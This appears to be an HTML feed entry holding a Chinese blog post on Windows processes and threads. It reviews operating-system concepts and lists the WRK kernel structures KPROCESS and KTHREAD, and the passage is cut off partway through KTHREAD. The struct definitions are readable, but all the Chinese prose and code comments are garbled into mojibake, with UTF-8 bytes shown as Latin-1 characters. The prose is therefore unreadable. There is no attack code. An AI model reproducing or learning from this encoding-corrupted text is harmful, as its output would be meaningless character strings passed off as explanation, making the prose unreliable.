    <content type="html"><![CDATA[<p>Windowsä¸­è¿›ç¨‹ä¸çº¿ç¨‹çš„è®¾ç½®</p><span id="more"></span><h1 id="å…³äºè¿›ç¨‹ä¸çº¿ç¨‹"><a class="markdownIt-Anchor" href="#å…³äºè¿›ç¨‹ä¸çº¿ç¨‹"></a> å…³äºè¿›ç¨‹ä¸çº¿ç¨‹</h1><h2 id="æ“ä½œç³»ç»Ÿå¤ä¹ "><a class="markdownIt-Anchor" href="#æ“ä½œç³»ç»Ÿå¤ä¹ "></a> æ“ä½œç³»ç»Ÿâ€œå¤ä¹ â€</h2><p>â€‹åœ¨å­¦ä¹ æ“ä½œç³»ç»Ÿçš„æ—¶å€™ï¼Œæœ‰ä¸ªé‡ç‚¹å°±æ˜¯è¿›ç¨‹ä¸çº¿ç¨‹çš„åŒºåˆ«ã€‚æœ€å¼€å§‹è¿›ç¨‹å’Œçº¿ç¨‹æ˜¯æ²¡æœ‰åˆ†å¼€çš„ï¼Œç”±äºå¤šæ•°æ“ä½œç³»ç»Ÿåˆ†å¼€äº†ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Œé‚£ä¹ˆç”¨æˆ·æ€å°±å¿…é¡»å’Œå†…æ ¸æ€è¿›è¡Œäº¤äº’æ‰èƒ½è°ƒç”¨ç³»ç»Ÿèµ„æºï¼ˆé€šè¿‡IOCTLäº¤äº’ï¼‰ã€‚è¿™æ ·æ¯ä¸€ä¸ªè¿›ç¨‹åœ¨å†…æ ¸å½“ä¸­éƒ½æœ‰ä¸€ä¸ªâ€œè¿›ç¨‹æè¿°ç¬¦â€çš„ä¸œè¥¿æ¥æè¿°è¿™ä¸ªè¿›ç¨‹ï¼Œå¹¶æ ¹æ®è°ƒåº¦ç®—æ³•å®Œæˆè¿›ç¨‹çš„è¿è¡Œã€‚è¿™é‡Œå°±å‡è®¾ä¸€ä¸ªè¿›ç¨‹<code>test.exe</code>è°ƒç”¨äº†<strong>0x40</strong>å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œåœ¨<strong>åªæœ‰</strong>è¿›ç¨‹çš„æ—¶å€™ï¼Œè¿›ç¨‹æè¿°ç¬¦ä¸­å°±ä¼šæ ‡è®°è¿™ä¸ªå†…å­˜è¢«è¿™ä¸ªè¿›ç¨‹ä½¿ç”¨ï¼ŒåŒæ—¶æŒ‡ä»¤å’Œè¿è¡Œéƒ½åœ¨å…¶ä¸­ã€‚<br />â€‹è¿™æ ·æœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œæˆ‘éœ€è¦ä¸¤ä¸ªè¿™ç§â€œè¿›ç¨‹â€æ¥è¿è¡Œï¼Œä¸”ä»–ä»¬éœ€è¦çš„æ°å¥½æ˜¯åŒä¸€å—å†…å­˜çš„ç›¸åŒæ•°æ®ï¼Œå¦‚æœåªæœ‰è¿›ç¨‹çš„è¯ï¼Œå°±ä¼šå­˜åœ¨ä¸¤ä¸ª0x40çš„å†…å­˜ï¼ŒåŒæ—¶é€ æˆä¸å¿…è¦çš„å¤åˆ¶ç²˜è´´ã€‚éšåå°±æœ‰äº†<strong>çº¿ç¨‹</strong>è¿™ä¸ªæ¦‚å¿µï¼Œæ¯”å¦‚é¢å¯¹ä¸Šè¿°æƒ…å†µï¼Œè¿›ç¨‹å°±åªå«æœ‰ä¸€ä¸ª0x40å¤§å°çš„å†…å­˜ï¼Œå¯¹å†…å­˜çš„è®¿é—®å°±äº¤ç»™è¿™ä¸ªçº¿ç¨‹å¯¹åº”çš„è¿›ç¨‹ã€‚</p><h2 id="è¿›ç¨‹å’Œç¨‹åº"><a class="markdownIt-Anchor" href="#è¿›ç¨‹å’Œç¨‹åº"></a> è¿›ç¨‹å’Œç¨‹åº</h2><p>â€‹Windowsçš„ä»»åŠ¡è°ƒåº¦ç®—æ³•å¯ä»¥å¾ˆå¥½åœ°é€‚åº”å¤šå¤„ç†å™¨å’Œå¤šä»»åŠ¡çš„æƒ…å½¢ï¼Œåœ¨windowsä¸­çš„è¿›ç¨‹ä¹Ÿéµå®ˆä¸Šè¿°çš„å‡†åˆ™ã€‚å¯¹äºWindowså†…æ ¸éœ€è¦åšçš„äº‹æƒ…æ˜¯ï¼š<strong>ç»´æŠ¤ä¸€ä¸ªå…¨å±€çš„è¿›ç¨‹è¡¨</strong>ï¼Œè®°å½•ä¸‹å½“å‰æœ‰å“ªäº›è¿›ç¨‹æ­£ åœ¨è¢«æ‰§è¡Œï¼›<strong>æŠŠæ—¶é—´åˆ†æˆé€‚å½“çš„ç‰‡æ®µ</strong>ï¼Œåœ¨ç°ä»£å¤„ç†å™¨ç»“æ„ä¸­ï¼Œè¿™å¯ä»¥é€šè¿‡è®¾ç½®æ—¶é’Ÿä¸­æ–­æ¥å®Œæˆï¼Œå› è€Œæ¯æ¬¡æ—¶é’Ÿä¸­æ–­åˆ°æ¥æ—¶ç³»ç»Ÿå°±ä¼šè·å¾—æ§åˆ¶æƒï¼›<strong>åœ¨è¿›ç¨‹é—´å®æ–½åˆ‡æ¢</strong>ï¼Œå³ä¿ç•™ä¸Šä¸€ä¸ªè¿› ç¨‹çš„ç¯å¢ƒä¿¡æ¯ï¼Œæ¢å¤ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œç¯å¢ƒã€‚å…³äºWindowsçš„è°ƒåº¦ç®—æ³•å¯ä»¥ç®€å•ç†è§£ä¸ºæ—¶é—´è½®ã€‚</p><p>â€‹å¦‚æœç¨‹åºæ˜¯ä¸€ä¸ªå®Œå…¨çš„æ¨¡å—ï¼Œé‚£ä¹ˆä»–çš„å†…å­˜å°±æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰çš„ç»å…¸å†…å­˜ç»“æ„ã€‚</p><img src="https://img.joe1sn.top/uploads/big/58d86fa1e2cc5aee1ae0b8da258a64d3.png" alt="image-20230614104209374" style="zoom:50%;" /><p>â€‹ä½†æ˜¯å¾€å¾€ä¸€ä¸ªæœ€ç®€å•çš„helloworldä¹Ÿä¼šè°ƒç”¨CRunTimeçš„ä»£ç ï¼Œæ‰€ä»¥æœ‰è¿›ç¨‹å°±èƒ½ä½¿ç”¨ <strong>å…±äº«å†…å­˜</strong> ï¼Œæ¯”å¦‚åœ¨é™æ€æ•°æ®åŒºæœ‰ç€ä¸€ä»½å¤åˆ¶ã€‚</p><h2 id="çº¿ç¨‹"><a class="markdownIt-Anchor" href="#çº¿ç¨‹"></a> çº¿ç¨‹</h2><p>â€‹çº¿ç¨‹ä¸ä»…ä»…æ˜¯ä¸€ä¸ªæ§åˆ¶æµï¼Œå®ƒè¿˜æœ‰æ›´å¤šçš„å†…å®¹ã€‚çº¿ç¨‹çš„è°ƒç”¨æ ˆï¼ˆcall stackï¼‰è®°å½•äº†å®ƒ ä½œä¸ºæ§åˆ¶æµçš„çŠ¶æ€ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ¯ä¸€å±‚å‡½æ•°è°ƒç”¨å’Œè¿”å›çš„æŒ‡ä»¤åœ°å€ã€‚çº¿ç¨‹ä¸€å®šéš¶å±äºæŸä¸ªè¿› ç¨‹ï¼Œå…¶æ§åˆ¶æµå¯ä»¥è®¿é—®è¿™ä¸ªè¿›ç¨‹ä¸­çš„èµ„æºï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„å†…å­˜æ•°æ®ä»¥åŠç³»ç»Ÿåˆ†é…ç»™æ­¤è¿›ç¨‹çš„ å…¶ä»–èµ„æºã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œç”±äºè¿™äº›çº¿ç¨‹éš¶å±äºåŒä¸€ä¸ªè¿›ç¨‹ï¼Œæ‰€ä»¥å®ƒä»¬ä¹‹é—´ç›¸ äº’é€šä¿¡è¦æ–¹ä¾¿å¾—å¤šï¼Œæ¯•ç«Ÿå‡ ä¹æ‰€æœ‰çš„èµ„æºï¼ˆå¹¶éå…¨éƒ¨ï¼‰å¯¹äºå®ƒä»¬æ¥è¯´éƒ½æ˜¯å…±äº«çš„ã€‚</p><h1 id="windows-ä¸­è¿›ç¨‹å’Œçº¿ç¨‹çš„æ•°æ®ç»“æ„"><a class="markdownIt-Anchor" href="#windows-ä¸­è¿›ç¨‹å’Œçº¿ç¨‹çš„æ•°æ®ç»“æ„"></a> Windows ä¸­è¿›ç¨‹å’Œçº¿ç¨‹çš„æ•°æ®ç»“æ„</h1><h2 id="å†…æ ¸å±‚çš„è¿›ç¨‹å’Œçº¿ç¨‹å¯¹è±¡"><a class="markdownIt-Anchor" href="#å†…æ ¸å±‚çš„è¿›ç¨‹å’Œçº¿ç¨‹å¯¹è±¡"></a> å†…æ ¸å±‚çš„è¿›ç¨‹å’Œçº¿ç¨‹å¯¹è±¡</h2><p>åœ¨å†…æ ¸å½“ä¸­çš„æè¿°ä¸º<code>KPROCESS</code>å’Œ<code>KTHREAD</code>ã€‚</p><p>åœ¨WRKä¸­çš„å®šä¹‰ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KPROCESS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     DISPATCHER_HEADER Header;<span class="comment">//è¡¨æ˜æ˜¯åˆ†å‘å™¨å¯¹è±¡ï¼Œå¯ç”¨äºç­‰å¾…ã€‚è¿›ç¨‹é€€å‡ºæ—¶ï¼Œæ­¤å¯¹è±¡ä¸ºæœ‰ä¿¡å·çŠ¶æ€</span></span><br><span class="line">     LIST_ENTRY ProfileListHead;<span class="comment">//è¿›ç¨‹å‚ä¸æ€§èƒ½åˆ†ææ—¶ï¼Œä½œä¸ºèŠ‚ç‚¹åŠ å…¥å…¨å±€æ€§èƒ½åˆ†æè¿›ç¨‹é“¾è¡¨ã€‚</span></span><br><span class="line">     ULONG DirectoryTableBase;<span class="comment">// ä¸¤ä¸ªæˆå‘˜çš„æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªæŒ‡å‘é¡µç›®å½•è¡¨åœ°å€ï¼Œç¬¬äºŒä¸ªæŒ‡å‘è¶…ç©ºé—´çš„é¡µç›®å½•è¡¨åœ°å€</span></span><br><span class="line">     ULONG Unused0;</span><br><span class="line">     KGDTENTRY LdtDescriptor;<span class="comment">//LDTçš„æè¿°ç¬¦</span></span><br><span class="line">     KIDTENTRY Int21Descriptor;<span class="comment">//ä¸ºäº†å…¼å®¹DOSï¼Œé€šè¿‡int 21hè°ƒç”¨ç³»ç»ŸåŠŸèƒ½</span></span><br><span class="line">     WORD IopmOffset;<span class="comment">//æŒ‡å®šIOPMï¼ˆIOæƒé™è¡¨ï¼ŒIO Privilege Mapï¼‰ä½ç½®ã€‚æ§åˆ¶è¿›ç¨‹çš„ç”¨æˆ·æ¨¡å¼IOè®¿é—®æƒé™</span></span><br><span class="line">     UCHAR Iopl;<span class="comment">//IOä¼˜å…ˆçº§ï¼ˆIO Privilege Levelï¼‰</span></span><br><span class="line">     UCHAR Unused;</span><br><span class="line">     ULONG ActiveProcessors;<span class="comment">//è®°å½•è¿›ç¨‹æ­£åœ¨å“ªäº›å¤„ç†å™¨ä¸Šè¿è¡Œ</span></span><br><span class="line">     ULONG KernelTime;<span class="comment">//åœ¨å†…æ ¸æ¨¡å¼è¿è¡Œæ‰€èŠ±æ—¶é—´</span></span><br><span class="line">     ULONG UserTime;<span class="comment">//åœ¨ç”¨æˆ·æ¨¡å¼è¿è¡Œæ‰€èŠ±æ—¶é—´</span></span><br><span class="line">     LIST_ENTRY ReadyListHead;<span class="comment">//ä¿å­˜è¿›ç¨‹ä¸­å¤„äºå°±ç»ªçŠ¶æ€ä½†æœªè¢«åŠ å…¥å…¨å±€å°±ç»ªé“¾è¡¨çš„çº¿ç¨‹</span></span><br><span class="line">     SINGLE_LIST_ENTRY SwapListEntry;<span class="comment">//è¿›ç¨‹è¦è¢«æ¢å‡ºæ—¶ï¼Œé€šè¿‡æ­¤åŸŸåŠ å…¥åˆ°KiProcessOutSwapListHeadä¸ºå¤´çš„å•é“¾è¡¨</span></span><br><span class="line">     PVOID VdmTrapcHandler;<span class="comment">//VDMç¯å¢ƒä¸‹è¿è¡Œ16ä½ç¨‹åºæ—¶ï¼Œå¤„ç†Ctrl+Cä¸­æ–­çš„å‡½æ•°</span></span><br><span class="line">     LIST_ENTRY ThreadListHead;<span class="comment">//æŒ‡å‘ä¸€ä¸ªé“¾è¡¨å¤´ï¼Œé“¾è¡¨ä¸­åŒ…å«è¯¥è¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹</span></span><br><span class="line">     ULONG ProcessLock;<span class="comment">//ä¸€ä¸ªè‡ªæ—‹é”å¯¹è±¡ã€‚ä¿è¯å¯¹è¿›ç¨‹æ•°æ®ç»“æ„ä¸­æˆå‘˜çš„äº’æ–¥è®¿é—®</span></span><br><span class="line">     ULONG Affinity;<span class="comment">//æŒ‡å®šè¯¥è¿›ç¨‹çš„çº¿ç¨‹å¯ä»¥åœ¨å“ªäº›å¤„ç†å™¨ä¸Šè¿è¡Œ</span></span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG AutoAlignment: <span class="number">1</span>;</span><br><span class="line">          ULONG DisableBoost: <span class="number">1</span>;<span class="comment">//</span></span><br><span class="line">          ULONG DisableQuantum: <span class="number">1</span>;</span><br><span class="line">          ULONG ReservedFlags: <span class="number">29</span>;</span><br><span class="line">          LONG ProcessFlags;</span><br><span class="line">     &#125;;</span><br><span class="line">     CHAR BasePriority;<span class="comment">//è¯¥è¿›ç¨‹çš„çº¿ç¨‹çš„åŸºæœ¬ä¼˜å…ˆçº§</span></span><br><span class="line">     CHAR QuantumReset;<span class="comment">//è¿›ç¨‹ä¸­çº¿ç¨‹çš„åŸºæœ¬æ—¶é™é‡ç½®å€¼</span></span><br><span class="line">     UCHAR State;<span class="comment">//è¯´æ˜è¿›ç¨‹æ˜¯å¦åœ¨å†…å­˜ä¸­</span></span><br><span class="line">     UCHAR ThreadSeed;<span class="comment">//è¯¥è¿›ç¨‹çš„ä¸‹ä¸€ä¸ªåˆ›å»ºçº¿ç¨‹çš„ç†æƒ³å¤„ç†å™¨</span></span><br><span class="line">     UCHAR PowerState;<span class="comment">//ç”µæºçŠ¶æ€</span></span><br><span class="line">     UCHAR IdealNode;<span class="comment">//è¿›ç¨‹ä¼˜å…ˆé€‰æ‹©çš„å¤„ç†å™¨èŠ‚ç‚¹</span></span><br><span class="line">     UCHAR Visited;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KEXECUTE_OPTIONS Flags;</span><br><span class="line">          UCHAR ExecuteOptions;<span class="comment">//NXæ‰§è¡Œé€‰é¡¹</span></span><br><span class="line">     &#125;;</span><br><span class="line">     ULONG StackCount;<span class="comment">//å½“å‰è¿›ç¨‹ä¸­æœ‰å¤šå°‘ä¸ªçº¿ç¨‹çš„æ ˆä½äºå†…å­˜ä¸­</span></span><br><span class="line">     LIST_ENTRY ProcessListEntry;<span class="comment">//å½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å…·æœ‰æ´»åŠ¨çº¿ç¨‹çš„è¿›ç¨‹é€šè¿‡è¿™ä¸ªåŸŸä¸²æˆä¸€ä¸ªé“¾è¡¨</span></span><br><span class="line">     UINT64 CycleTime;</span><br><span class="line">&#125; KPROCESS, *PKPROCESS;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåœ¨çº¿ç¨‹å½“ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KTHREAD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     DISPATCHER_HEADER Header;</span><br><span class="line">     UINT64 CycleTime;</span><br><span class="line">     ULONG HighCycleTime;</span><br><span class="line">     UINT64 QuantumTarget;</span><br><span class="line">     PVOID InitialStack;</span><br><span class="line">     PVOID StackLimit;</span><br><span class="line">     PVOID KernelStack;</span><br><span class="line">     ULONG ThreadLock;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KAPC_STATE ApcState;</span><br><span class="line">          UCHAR ApcStateFill[<span class="number">23</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     CHAR Priority;</span><br><span class="line">     WORD NextProcessor;</span><br><span class="line">     WORD DeferredProcessor;</span><br><span class="line">     ULONG ApcQueueLock;</span><br><span class="line">     ULONG ContextSwitches;</span><br><span class="line">     UCHAR State;</span><br><span class="line">     UCHAR NpxState;</span><br><span class="line">     UCHAR WaitIrql;</span><br><span class="line">     CHAR WaitMode;</span><br><span class="line">     LONG WaitStatus;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          PKWAIT_BLOCK WaitBlockList;</span><br><span class="line">          PKGATE GateObject;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG KernelStackResident: <span class="number">1</span>;</span><br><span class="line">          ULONG ReadyTransition: <span class="number">1</span>;</span><br><span class="line">          ULONG ProcessReadyQueue: <span class="number">1</span>;</span><br><span class="line">          ULONG WaitNext: <span class="number">1</span>;</span><br><span class="line">          ULONG SystemAffinityActive: <span class="number">1</span>;</span><br><span class="line">          ULONG Alertable: <span class="number">1</span>;</span><br><span class="line">          ULONG GdiFlushActive: <span class="number">1</span>;</span><br><span class="line">          ULONG Reserved: <span class="number">25</span>;</span><br><span class="line">          LONG MiscFlags;</span><br><span class="line">     &#125;;</span><br><span class="line">     UCHAR WaitReason;</span><br><span class="line">     UCHAR SwapBusy;</span><br><span class="line">     UCHAR Alerted[<span class="number">2</span>];</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          LIST_ENTRY WaitListEntry;</span><br><span class="line">          SINGLE_LIST_ENTRY SwapListEntry;</span><br><span class="line">     &#125;;</span><br><span class="line">     PKQUEUE Queue;</span><br><span class="line">     ULONG WaitTime;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               SHORT KernelApcDisable;</span><br><span class="line">               SHORT SpecialApcDisable;</span><br><span class="line">          &#125;;</span><br><span class="line">          ULONG CombinedApcDisable;</span><br><span class="line">     &#125;;</span><br><span class="line">     PVOID Teb;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KTIMER Timer;</span><br><span class="line">          UCHAR TimerFill[<span class="number">40</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG AutoAlignment: <span class="number">1</span>;</span><br><span class="line">          ULONG DisableBoost: <span class="number">1</span>;</span><br><span class="line">          ULONG EtwStackTraceApc1Inserted: <span class="number">1</span>;</span><br><span class="line">          ULONG EtwStackTraceApc2Inserted: <span class="number">1</span>;</span><br><span class="line">          ULONG CycleChargePending: <span class="number">1</span>;</span><br><span class="line">          ULONG CalloutActive: <span class="number">1</span>;</span><br><span class="line">          ULONG ApcQueueable: <span class="number">1</span>;</span><br><span class="line">          ULONG EnableStackSwap: <span class="number">1</span>;</span><br><span class="line">          ULONG GuiThread: <span class="number">1</span>;</span><br><span class="line">          ULONG ReservedFlags: <span class="number">23</span>;</span><br><span class="line">          LONG ThreadFlags;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KWAIT_BLOCK WaitBlock[<span class="number">4</span>];</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR WaitBlockFill0[<span class="number">23</span>];</span><br><span class="line">               UCHAR IdealProcessor;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR WaitBlockFill1[<span class="number">47</span>];</span><br><span class="line">               CHAR PreviousMode;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR WaitBlockFill2[<span class="number">71</span>];</span><br><span class="line">               UCHAR ResourceIndex;</span><br><span class="line">          &#125;;</span><br><span class="line">          UCHAR WaitBlockFill3[<span class="number">95</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     UCHAR LargeStack;</span><br><span class="line">     LIST_ENTRY QueueListEntry;</span><br><span class="line">     PKTRAP_FRAME TrapFrame;</span><br><span class="line">     PVOID FirstArgument;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          PVOID CallbackStack;</span><br><span class="line">          ULONG CallbackDepth;</span><br><span class="line">     &#125;;</span><br><span class="line">     PVOID ServiceTable;</span><br><span class="line">     UCHAR ApcStateIndex;</span><br><span class="line">     CHAR BasePriority;</span><br><span class="line">     CHAR PriorityDecrement;</span><br><span class="line">     UCHAR Preempted;</span><br><span class="line">     UCHAR AdjustReason;</span><br><span class="line">     CHAR AdjustIncrement;</span><br><span class="line">     UCHAR Spare01;</span><br><span class="line">     CHAR Saturation;</span><br><span class="line">     ULONG SystemCallNumber;</span><br><span class="line">     ULONG Spare02;</span><br><span class="line">     ULONG UserAffinity;</span><br><span class="line">     PKPROCESS Process;</span><br><span class="line">     ULONG Affinity;</span><br><span class="line">     PKAPC_STATE ApcStatePointer[<span class="number">2</span>];</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KAPC_STATE SavedApcState;</span><br><span class="line">          UCHAR SavedApcStateFill[<span class="number">23</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     CHAR FreezeCount;</span><br><span class="line">     CHAR SuspendCount;</span><br><span class="line">     UCHAR UserIdealProcessor;</span><br><span class="line">     UCHAR Spare03;</span><br><span class="line">     UCHAR Iopl;</span><br><span class="line">     PVOID Win32Thread;</span><br><span class="line">     PVOID StackBase;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KAPC SuspendApc;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill0[<span class="number">1</span>];</span><br><span class="line">               CHAR Spare04;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill1[<span class="number">3</span>];</span><br><span class="line">               UCHAR QuantumReset;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill2[<span class="number">4</span>];</span><br><span class="line">               ULONG KernelTime;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill3[<span class="number">36</span>];</span><br><span class="line">               PKPRCB WaitPrcb;</span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               UCHAR SuspendApcFill4[<span class="number">40</span>];</span><br><span class="line">               PVOID LegoData;</span><br><span class="line">          &#125;;</span><br><span class="line">          UCHAR SuspendApcFill5[<span class="number">47</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     UCHAR PowerState;</span><br><span class="line">     ULONG UserTime;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          KSEMAPHORE SuspendSemaphore;</span><br><span class="line">          UCHAR SuspendSemaphorefill[<span class="number">20</span>];</span><br><span class="line">     &#125;;</span><br><span class="line">     ULONG SListFaultCount;</span><br><span class="line">     LIST_ENTRY ThreadListEntry;</span><br><span class="line">     LIST_ENTRY MutantListHead;</span><br><span class="line">     PVOID 